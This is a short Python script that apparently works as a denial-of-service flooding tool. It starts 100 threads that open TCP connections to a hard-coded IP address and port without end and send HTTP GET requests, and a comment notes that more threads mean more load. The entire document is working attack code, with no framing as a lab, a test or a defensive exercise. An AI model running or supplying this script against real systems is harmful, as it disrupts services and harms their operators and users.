import socket
import threading

target_ip = "192.168.100.54"  # target IP adress
target_port = 8080

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: attack\r\n\r\n")
            s.close()
            print("Packet sent!")
        except:
            print("Failed to connect")

for i in range(100):  # More threads = more load
    t = threading.Thread(target=attack)
    t.start()
